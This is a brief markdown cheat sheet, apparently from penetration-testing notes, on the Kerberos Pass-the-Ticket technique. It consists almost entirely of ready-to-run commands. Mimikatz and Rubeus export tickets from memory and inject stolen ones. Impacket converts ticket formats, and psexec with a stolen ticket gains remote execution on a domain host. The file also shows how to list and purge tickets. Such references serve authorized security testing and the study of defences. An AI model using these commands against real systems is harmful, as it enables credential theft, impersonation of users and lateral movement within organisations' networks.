---
tags:
  - Foundational
  - Privilege_Escalation
  - Windows
---

## Pass-the-Ticket
resources: [HackTricks Pass-the-Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket)

> [!info] Use stolen Kerberos tickets to authenticate as another user. No password or hash needed - just the ticket.

### Export Tickets from Memory [Remote]
```powershell
.\mimikatz.exe "sekurlsa::tickets /export" "exit"
```

```powershell
# Export specific ticket types
.\Rubeus.exe dump /nowrap
```

```powershell
# Dump current user's tickets
.\Rubeus.exe triage
```

### Inject Ticket with Mimikatz [Remote]
```powershell
.\mimikatz.exe "kerberos::ptt <ticket.kirbi>" "exit"
```

### Inject Ticket with Rubeus [alternative]
```powershell
.\Rubeus.exe ptt /ticket:<base64_ticket>
```

```powershell
.\Rubeus.exe ptt /ticket:<ticket.kirbi>
```

### Convert Ticket Formats [Local]
```bash
# .kirbi (Windows) to .ccache (Linux)
impacket-ticketConverter ticket.kirbi ticket.ccache
```

```bash
# .ccache to .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### Use Ticket from Kali [Local]
```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass <Domain>/<Username>@<TargetFQDN>
```

### Verify Injected Tickets
```powershell
klist
```

### Clear Tickets
```powershell
klist purge
```

```powershell
.\mimikatz.exe "kerberos::purge" "exit"
```
